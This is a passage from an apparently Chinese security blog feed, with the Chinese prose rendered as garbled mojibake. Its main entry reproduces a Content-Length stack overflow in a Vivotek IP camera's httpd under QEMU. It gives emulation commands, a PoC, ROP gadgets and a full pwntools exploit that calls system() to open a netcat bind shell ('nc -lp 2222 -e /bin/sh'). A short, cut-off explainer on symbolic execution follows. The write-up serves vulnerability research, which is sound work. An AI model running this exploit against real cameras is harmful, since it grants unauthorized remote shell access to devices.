video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[0] is /video3.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[1] is /video4.mjpg</span><br><span class="line">AM_ParseConfigFile failed</span><br><span class="line">[15/Apr/2021:01:01:02 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)</span><br><span class="line">[15/Apr/2021:01:01:02 +0000] boa: starting server pid=3511, port 80</span><br><span class="line"><span class="meta">$</span><span class="bash"> ps aux | grep httpd</span></span><br><span class="line">root       3511  0.8  0.0 4240192 6216 pts/0    Sl   18:01   0:00 ./qemu-arm-static ./usr/sbin/httpd</span><br><span class="line">kk         3514  0.0  0.0  14436  1068 pts/0    S+   18:01   0:00 grep --color=auto httpd</span><br></pre></td></tr></table></figure><h2 id="sys-mod"><a href="#sys-mod" class="headerlink" title="sys-mod"></a>sys-mod</h2><ol><li>é¢â€¦æˆ‘çš„ç£ç›˜æœ‰ç‚¹å„¿é—®é¢˜</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo guestmount -a debian_wheezy_armel_standard.qcow2 -m /dev/sda2 /mnt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp -rf ./squashfs-root /mnt/root/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo guestunmount /mnt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo tunctl -t tap0 -u `whoami`</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ifconfig tap0 192.168.65.1/24</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"></span><br><span class="line">root@debian-armel:~# ifconfig eth0 192.168.65.2/24</span><br><span class="line">root@debian-armel:~# mount -t proc /proc ./squashfs-root/proc# é»˜è®¤/devå’Œ/procåœ¨chrootçš„æ—¶å€™æ˜¯ä¸ä¼šæŒ‚è½½çš„ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‚è½½ã€‚</span><br><span class="line">root@debian-armel:~# mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">root@debian-armel:~# chroot ./squashfs-root /bin/sh</span><br></pre></td></tr></table></figure><ol start="2"><li>ç”¨è¿™ä¸ª<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo tunctl -t tap0 -u `whoami`</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ifconfig tap0 192.168.65.1/24</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/sda1"</span>  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"></span><br><span class="line">; è¿›å…¥åä½¿ç”¨ftpè¿›è¡Œæ–‡ä»¶ä¼ è¾“</span><br><span class="line">root@debian-armel:~# ifconfig eth0 192.168.65.2/24</span><br><span class="line">; ä¼ è¾“å®Œæˆå</span><br><span class="line">root@debian-armel:~# mount -t proc /proc ./squashfs-root/proc; é»˜è®¤/devå’Œ/procåœ¨chrootçš„æ—¶å€™æ˜¯ä¸ä¼šæŒ‚è½½çš„ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‚è½½ã€‚</span><br><span class="line">root@debian-armel:~# mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">root@debian-armel:~# chroot ./squashfs-root /bin/sh</span><br><span class="line">/ # ls</span><br><span class="line">bin              home             qemu-arm-static  tmpfs</span><br><span class="line">dev              lib              root             usr</span><br><span class="line">drivers          linuxrc          sbin             var</span><br><span class="line">etc              mnt              sys              www</span><br><span class="line">gdbserver        proc             tmp</span><br><span class="line">; åŒä¸Šé¢usermodï¼Œä¿®æ”¹ä¸€ä¸‹hostnameå°±å¯ä»¥è·‘èµ·æ¥äº†</span><br><span class="line">/ # ./usr/sbin/httpd</span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[0] is /video3.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[1] is /video4.mjpg</span><br><span class="line">AM_ParseConfigFile failed</span><br><span class="line">[15/Apr/2021:05:49:21 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)</span><br><span class="line">[15/Apr/2021:05:49:21 +0000] boa: starting server pid=2400, port 80</span><br><span class="line">/ # ps T | grep httpd</span><br><span class="line"> 2400 root      1336 S    ./usr/sbin/httpd</span><br><span class="line"> 2406 root      1368 S    grep httpd</span><br><span class="line">/ # ./gdbserver --attach 192.168.65.2:1234 $(ps|grep upnpd|grep -v grep|awk '&#123;print $1&#125;');è¿œç¨‹è°ƒè¯•</span><br></pre></td></tr></table></figure></li></ol><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>æ¼æ´ä½äº<code>/usr/sbin/httpd</code>ä¸­çš„<code>sub_17F80</code>ï¼Œæ˜¯ç”±äºContent-Lengthå¼•èµ·çš„æº¢å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFstrncpy.png" alt></p><blockquote><ul><li><p>strncpy()ç”¨æ¥å¤åˆ¶å­—ç¬¦ä¸²çš„å‰nä¸ªå­—ç¬¦ï¼Œå…¶åŸå‹ä¸ºï¼š<br><code>char * strncpy(char *dest, const char *src, size_t n);</code></p><p>ã€å‚æ•°è¯´æ˜ã€‘dest ä¸ºç›®æ ‡å­—ç¬¦ä¸²æŒ‡é’ˆï¼Œsrc ä¸ºæºå­—ç¬¦ä¸²æŒ‡é’ˆã€‚</p><p>strncpy()ä¼šå°†å­—ç¬¦ä¸²srcå‰nä¸ªå­—ç¬¦æ‹·è´åˆ°å­—ç¬¦ä¸²destã€‚</p><p>ä¸åƒstrcpy()ï¼Œ<strong>strncpy()ä¸ä¼šå‘destè¿½åŠ ç»“æŸæ ‡è®°â€™\0â€™</strong>ï¼Œè¿™å°±å¼•å‘äº†å¾ˆå¤šä¸åˆå¸¸ç†çš„é—®é¢˜ï¼Œå°†åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­è¯´æ˜ã€‚</p><p>æ³¨æ„ï¼šsrc å’Œ dest æ‰€æŒ‡çš„å†…å­˜åŒºåŸŸä¸èƒ½é‡å ï¼Œä¸” dest å¿…é¡»æœ‰è¶³å¤Ÿçš„ç©ºé—´æ”¾ç½®nä¸ªå­—ç¬¦ã€‚</p><p>ã€è¿”å›å€¼ã€‘è¿”å›å­—ç¬¦ä¸²destã€‚</p></li><li><p>strchr() ç”¨æ¥æŸ¥æ‰¾æŸå­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå…¶åŸå‹ä¸ºï¼š<br><code>char * strchr (const char *str, int c);</code></p><p>ã€å‚æ•°ã€‘str ä¸ºè¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ï¼Œc ä¸ºè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚</p><p>strchr() å°†ä¼šæ‰¾å‡º <strong>str å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„å­—ç¬¦ c çš„åœ°å€</strong>ï¼Œç„¶åå°†è¯¥åœ°å€è¿”å›ã€‚</p><p>æ³¨æ„ï¼šå­—ç¬¦ä¸² str çš„ç»“æŸæ ‡å¿— NUL ä¹Ÿä¼šè¢«çº³å…¥æ£€ç´¢èŒƒå›´ï¼Œæ‰€ä»¥ str çš„ç»„åä¸€ä¸ªå­—ç¬¦ä¹Ÿå¯ä»¥è¢«å®šä½ã€‚</p><p>ã€è¿”å›å€¼ã€‘å¦‚æœæ‰¾åˆ°æŒ‡å®šçš„å­—ç¬¦åˆ™è¿”å›è¯¥å­—ç¬¦æ‰€åœ¨åœ°å€ï¼Œå¦åˆ™è¿”å› NULLã€‚</p><p>è¿”å›çš„åœ°å€æ˜¯å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­éšæœºåˆ†é…çš„åœ°å€å†åŠ ä¸Šä½ æ‰€æœç´¢çš„å­—ç¬¦åœ¨å­—ç¬¦ä¸²ä½ç½®ã€‚è®¾å­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ä¸º iï¼Œé‚£ä¹ˆè¿”å›çš„åœ°å€å¯ä»¥ç†è§£ä¸º str + iã€‚</p></li></ul><p><a href="https://www.huaweicloud.com/articles/11adf8c5e55a63fec81650988a8eeedb.html" target="_blank" rel="noopener">GET POST PUT DELETEçš„åŒºåˆ«</a></p></blockquote><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">&quot;Content-Length&quot;:&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.65.2&quot; + &quot;/cgi-bin/admin/upgrade.cgi&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url, headers=header)</span><br></pre></td></tr></table></figure><p>å¯ä»¥æµ‹å‡ºåç§»æ˜¯0x33ï¼ˆé¢æˆ‘å’Œç½‘ä¸Šåˆ«äººçš„åç§»ä¸ä¸€æ ·å‘¢ï¼‰</p><p>æ ˆæº¢å‡ºå°±åˆ©ç”¨ROPæ¥åšï¼Œå…³äºarmä»¥å‰ä¹Ÿåšè¿‡ã€‚æ‰€ä»¥å°±è€ƒè™‘å°†å‚æ•°æ”¾å…¥R0ï¼Œç›®æ ‡å‡½æ•°systemæ”¾åˆ°PCä¸­</p><blockquote><ol><li><p>å‚æ•°ä¼ é€’</p><p>å‰4ä¸ªå‚æ•°é€šè¿‡R0 ~ R3ä¼ é€’ï¼Œç¬¬4ä¸ªå‚æ•°éœ€è¦é€šè¿‡spè®¿é—®ï¼Œç¬¬5ä¸ªå‚æ•°éœ€è¦sp+4è®¿é—®ï¼Œç¬¬nä¸ªå‚æ•°éœ€è¦é€šè¿‡sp + 4*(n-4)è®¿é—®ï¼›å½“å‚æ•°ä¸ªæ•°å¤šäº4ä¸ªæ—¶ï¼Œå°†å¤šä½™çš„å‚æ•°é€šè¿‡æ•°æ®æ ˆè¿›è¡Œä¼ é€’ï¼Œå…¥æ ˆé¡ºåºä¸å‚æ•°é¡ºåºæ­£å¥½ç›¸åï¼Œå­ç¨‹åºè¿”å›å‰æ— éœ€æ¢å¤R0~R3çš„å€¼</p></li><li><p>åœ¨å­ç¨‹åºä¸­ï¼Œä½¿ç”¨R4~R11ä¿å­˜å±€éƒ¨å˜é‡ï¼Œè‹¥ä½¿ç”¨éœ€è¦å…¥æ ˆä¿å­˜ï¼Œå­ç¨‹åºè¿”å›å‰éœ€è¦æ¢å¤è¿™äº›å¯„å­˜å™¨ï¼›R12æ˜¯ä¸´æ—¶å¯„å­˜å™¨ï¼Œä½¿ç”¨ä¸éœ€è¦ä¿å­˜</p></li><li><p>å­ç¨‹åºè¿”å›32ä½çš„æ•´æ•°ï¼Œä½¿ç”¨R0è¿”å›ï¼›è¿”å›64ä½æ•´æ•°æ—¶ï¼Œä½¿ç”¨R0è¿”å›ä½ä½ï¼ŒR1è¿”å›é«˜ä½</p></li></ol></blockquote><p>ä½¿ç”¨ROPgadgetæŸ¥æ‰¾å¯ç”¨çš„ROPé“¾ï¼Œåœ¨httpdä¸­åœ°å€éƒ½å«æœ‰00ï¼Œå¯¹äºstrncpyä¼šæˆªæ–­æ— æ³•ä½¿ç”¨ï¼Œåœ¨libcä¸­åŠ ä¸ŠåŸºå€ä»¥åå°±å¥½å¾ˆå¤šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./lib/libuClibc-0.9.33.3-git.so --only &quot;pop|mov&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">...</span><br><span class="line">0x00033100 : pop &#123;r0, pc&#125;# è¿™æ¡æ˜¯æœ€ç®€å•çš„ï¼Œä½†æ˜¯ç”±äºåœ°å€å­˜åœ¨00ï¼Œä¼šè¢«æˆªæ–­ï¼Œæ‰€ä»¥è€ƒè™‘å…ˆä¼ å…¥å…¶ä»–å¯„å­˜å™¨ï¼Œå†ç”±å…¶ä»–å¯„å­˜å™¨ä¼ é€’ç»™R0</span><br><span class="line">0x00048784 : pop &#123;r1, pc&#125;# å…ˆä¼ é€’ç»™R1ï¼Œé¡ºä¾¿å°†ç¬¬äºŒæ¡gadgetä¼ ç»™pc</span><br><span class="line">0x00016aa4 : mov r0, r1 ; pop &#123;r4, r5, pc&#125;# ç¬¬äºŒæ¡gadgetï¼Œå°†R1ä¼ é€’ç»™R0ï¼Œå†å°†æ ˆä¸­çš„å†…å®¹ä¾æ¬¡ä¼ é€’ç»™r4\r5\pc</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>è™½ç„¶è¯´è¿™ç§è®¾å¤‡ä¸€èˆ¬éƒ½ä¸ä¼šå¼€å¯ASLRï¼Œä½†æ˜¯è¿™ä¸ªdebiané»˜è®¤å¼€å¯çš„ï¼Œå¯¹æˆ‘ä»¬è°ƒè¯•ç¨‹åºå¾ˆä¸å‹å¥½ï¼Œå…ˆå…³æ‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ # echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æŸ¥çœ‹libcåŸºå€å¯ä»¥ä½¿ç”¨gdbä¸­çš„<code>vmmap</code>æˆ–åœ¨debianè™šæ‹Ÿæœºä¸­ä½¿ç”¨<code>cat /proc/xxxx[è¿›ç¨‹å·]/maps</code>æŸ¥çœ‹</p><p>ç»¼ä¸Šï¼Œæ„é€ payloadä¸º<code>&quot;a&quot;*offset+p32(rop1)+p32(r0-&gt;cmd_addr)+p32(rop2)+p32(r4_content)+p32(r5_content)+p32(sys_addr)+cmd</code></p><p>è¿™ä¸ªcmdå­—ç¬¦ä¸²å¯ä»¥å…ˆéšä¾¿å†™ï¼Œç„¶ååˆ°æ ˆä¸­æŸ¥æ‰¾è¿™ä¸ªå­—ç¬¦ä¸²å°±å¯ä»¥å¾—åˆ°åœ°å€ï¼ˆå®é™…åœ°å€éœ€è¦å°†æŸ¥åˆ°çš„åœ°å€å†-1ï¼‰</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">libc_base = 0xb6f2d000</span><br><span class="line">libc = ELF(&quot;./lib/libuClibc-0.9.33.3-git.so&quot;)</span><br><span class="line">sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">rop1 = libc_base + 0x00048784 # pop &#123;r1, pc&#125;</span><br><span class="line">rop2 = libc_base + 0x00016aa4 # mov r0, r1 ; pop &#123;r4, r5, pc&#125;</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line">success(&quot;rop1 = &quot;+hex(rop1))</span><br><span class="line">success(&quot;rop2 = &quot;+hex(rop2))</span><br><span class="line">cmd = &quot;nc -lp 2222 -e /bin/sh;&quot;</span><br><span class="line">cmd_addr = 0xbeffeb64</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">&quot;Content-Length&quot;:&quot;a&quot;*0x33 + p32(rop1) + p32(cmd_addr) + p32(rop2) + &quot;a&quot;*4 + &quot;b&quot;*4 + p32(sys_addr) + cmd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.65.2&quot; + &quot;/cgi-bin/admin/upgrade.cgi&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url, headers=header)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFshell.png" alt></p><blockquote><p>Reference:</p><p><a href="https://xz.aliyun.com/t/5054#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054#toc-0</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å›ºä»¶å½±å“ç‰ˆæœ¬ï¼šå¤ªå¤šäº†ï¼Œä»¥CC8160 ä¸ºä¾‹&lt;/p&gt;
&lt;p&gt;å›ºä»¶ä¸‹è½½åœ°å€ï¼š&lt;a href=&quot;https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip&quot; target=&quot;_blank&quot; rel=&quot;</summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="p1Kk.github.io/categories/æ¼æ´å¤ç°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="æ ˆæº¢å‡º" scheme="p1Kk.github.io/tags/æ ˆæº¢å‡º/"/>
    
    <category term="æ‘„åƒå¤´" scheme="p1Kk.github.io/tags/æ‘„åƒå¤´/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¦å·æ‰§è¡Œ&amp;æ±¡ç‚¹åˆ†æç®€è¿°</title>
    <link href="p1Kk.github.io/2021/04/04/others/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C&amp;%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    <id>p1Kk.github.io/2021/04/04/others/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C&amp;%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/</id>
    <published>2021-04-03T16:00:00.000Z</published>
    <updated>2021-10-16T09:14:04.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¬¦å·æ‰§è¡Œ"><a href="#ç¬¦å·æ‰§è¡Œ" class="headerlink" title="ç¬¦å·æ‰§è¡Œ"></a>ç¬¦å·æ‰§è¡Œ</h1><p>ç»™ä¸€ä¸ªç»“æœï¼Œæ±‚è¾“å…¥ã€‚</p><p>æ ¹æ®å‘å±•çŠ¶å†µ,å¯ä»¥å°†ç¬¦å·æ‰§è¡Œåˆ†ä¸ºç»å…¸ç¬¦å·æ‰§è¡Œã€åŠ¨æ€ç¬¦å·æ‰§è¡Œå’Œé€‰æ‹©æ€§ç¬¦å·æ‰§è¡Œ</p><h2 id="ç»å…¸ç¬¦å·æ‰§è¡Œ"><a href="#ç»å…¸ç¬¦å·æ‰§è¡Œ" class="headerlink" title="ç»å…¸ç¬¦å·æ‰§è¡Œ"></a>ç»å…¸ç¬¦å·æ‰§è¡Œ</h2><p>ç»å…¸ç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡ä½¿ç”¨ç¬¦å·å€¼æ¥ä»£æ›¿å…·ä½“å€¼ä½œä¸ºç¨‹åºè¾“å…¥ï¼Œå¹¶ç”¨ç¬¦å·è¡¨è¾¾å¼æ¥è¡¨ç¤ºä¸ç¬¦å·å€¼ç›¸å…³çš„ç¨‹åºå˜é‡çš„å€¼ã€‚ç»å…¸ç¬¦å·æ‰§è¡Œ<strong>å¹¶ä¸çœŸå®åœ°æ‰§è¡Œ</strong>,è€Œæ˜¯åŸºäºè§£æç¨‹åºï¼Œé€šè¿‡ç¬¦å·å€¼æ¨¡æ‹Ÿæ‰§è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">twice</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testme</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">z = twice(y);</span><br><span class="line"><span class="keyword">if</span> (z == x)&#123;</span><br><span class="line"><span class="keyword">if</span> (x &gt; y+<span class="number">10</span>)</span><br><span class="line">ERROR;</span><br><span class="line">&#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">x = sym_input();</span><br><span class="line">y = sym_input();</span><br><span class="line">testme(x, y);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¦å·æ‰§è¡Œä½¿ç”¨<strong>ç¬¦å·å€¼</strong>ä»£æ›¿å…·ä½“å€¼ï¼Œåœ¨ç¬¦å·æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œç¬¦å·æ‰§è¡Œå¼•æ“å§‹ç»ˆä¿æŒä¸€ä¸ªçŠ¶æ€ä¿¡æ¯(pc, Ï€, Ïƒ)ï¼Œå…¶ä¸­ï¼š</p><p>â€‹    1ï¼‰pc æŒ‡å‘éœ€è¦å¤„ç†çš„ä¸‹ä¸€æ¡ç¨‹åºè¯­å¥ï¼Œå…¶å¯ä»¥æ˜¯èµ‹å€¼è¯­å¥ã€æ¡ä»¶åˆ†æ”¯è¯­å¥æˆ–è€…æ˜¯è·³è½¬è¯­å¥ã€‚</p><p>â€‹    2ï¼‰Ï€ æŒ‡ä»£è·¯å¾„çº¦æŸä¿¡æ¯ï¼Œè¡¨ç¤ºä¸ºæ‰§è¡Œåˆ°ç¨‹åºç‰¹å®šè¯­å¥éœ€è¦ç»è¿‡çš„æ¡ä»¶åˆ†æ”¯ï¼Œä»¥åŠå„åˆ†æ”¯å¤„å…³äºç¬¦å· Î±_i çš„è¡¨è¾¾å¼ã€‚åœ¨åˆ†æçš„è¿‡ç¨‹ä¸­ï¼Œå°†å…¶åˆå§‹å®šä¹‰ä¸º Ï€ = trueã€‚</p><p>â€‹    3ï¼‰Ïƒ è¡¨ç¤ºä¸ç¨‹åºå˜é‡ç›¸å…³çš„ç¬¦å·å€¼é›†ï¼ŒåŒ…æ‹¬å«æœ‰å…·ä½“å€¼å’Œç¬¦å·å€¼ Î±<sub>i</sub> çš„è¡¨è¾¾å¼</p><p>æ®æ­¤åˆ†æä¸Šè¿°ä»£ç æ®µï¼š</p><ul><li>å¼€å§‹æ‰§è¡Œ</li></ul><p>â€‹    ç¬¦å·å˜é‡Ïƒ : Î±, Î² </p><p>â€‹    åˆå§‹çŠ¶æ€ä¸ºÏƒ : {x â†’ Î±, y â†’ Î²}; Ï€ï¼true</p><ul><li>æ‰§è¡Œåˆ°ç¬¬6è¡Œ</li></ul><p>â€‹    Ïƒ : {x â†’ Î±, y â†’ Î², z â†’ 2âˆ—Î²}; Ï€ï¼true</p><ul><li>æ‰§è¡Œåˆ°ç¬¬7è¡Œï¼Œå»¶ä¼¸å‡ºä¸¤ä¸ªåˆ†æçŠ¶æ€</li></ul><p>â€‹    trueè·¯å¾„ï¼šif z == x â†’ Ïƒ : {x â†’ Î±, y â†’ Î², z â†’ 2âˆ—Î²}; Ï€: 2âˆ—Î² == Î±</p><p>â€‹                                trueè·¯å¾„ï¼šif x &gt; y+10 â†’ Ïƒ : {x â†’ Î±, y â†’ Î², z â†’ 2âˆ—Î²}; Ï€: {2âˆ—Î² == Î± âˆ© Î± &gt; Î²+10}</p><p>â€‹                                falseè·¯å¾„ï¼šif x &gt; y+10 â†’ Ïƒ : {x â†’ Î±, y â†’ Î², z â†’ 2âˆ—Î²}; Ï€: {2âˆ—Î² == Î± âˆ© Î± &lt;= Î²+10}</p><p>â€‹    falseè·¯å¾„ï¼šif z != x â†’ Ïƒ : {x â†’ Î±, y â†’ Î², z â†’ 2âˆ—Î²}; Ï€: 2âˆ—Î² != Î±</p><p>ä¼ ç»Ÿç¬¦å·æ‰§è¡Œåœ¨åŸç†ä¸Šæ˜¯ å¯ä»¥å¯¹ç¨‹åºè·¯å¾„è¿›è¡Œå…¨è¦†ç›–çš„,è€Œä¸”å¯ä»¥é’ˆå¯¹æ¯ä¸€è·¯å¾„éƒ½ç”Ÿ æˆç¬¦åˆè¯¥è·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ã€‚</p><ul><li><p>æ‰§è¡Œè·¯å¾„ï¼ˆexecution pathï¼‰true falseåºåˆ—</p></li><li><p>æ‰§è¡Œæ ‘ï¼ˆexecution treeï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211012161441293.png" alt="image-20211012161441293"></p></li></ul><h2 id="åŠ¨æ€ç¬¦å·æ‰§è¡Œ"><a href="#åŠ¨æ€ç¬¦å·æ‰§è¡Œ" class="headerlink" title="åŠ¨æ€ç¬¦å·æ‰§è¡Œ"></a>åŠ¨æ€ç¬¦å·æ‰§è¡Œ</h2><p>ç¬¦å·æ‰§è¡Œåœ¨å‘å±•è¿‡ç¨‹ä¸­å‡ºç°äº†ä¸€ç§å«åš<strong>åŠ¨æ€ç¬¦å·æ‰§è¡Œ</strong>çš„æ–¹æ³•ï¼ˆconcrete and symbolicï¼Œ <code>concolic</code>ï¼‰ã€‚åŠ¨æ€ç¬¦å·æ‰§è¡Œæ˜¯<strong>ä»¥å…·ä½“æ•°å€¼ä½œä¸ºè¾“å…¥</strong>æ¥æ¨¡æ‹Ÿæ‰§è¡Œç¨‹åºä»£ç ï¼Œä¸ä¼ ç»Ÿé™æ€ç¬¦å·æ‰§è¡Œç›¸æ¯”ï¼Œå…¶è¾“å…¥å€¼çš„è¡¨ç¤ºå½¢å¼ä¸åŒã€‚åŠ¨æ€ç¬¦å·æ‰§è¡Œä½¿ç”¨å…·ä½“å€¼ä½œä¸ºè¾“å…¥ï¼ŒåŒæ—¶å¯åŠ¨ä»£ç æ¨¡æ‹Ÿæ‰§è¡Œå™¨ï¼Œå¹¶ä»å½“å‰è·¯å¾„çš„åˆ†æ”¯è¯­å¥çš„è°“è¯ä¸­æœé›†æ‰€æœ‰ç¬¦å·çº¦æŸã€‚ç„¶åä¿®æ”¹è¯¥ç¬¦å·çº¦æŸå†…å®¹æ„é€ 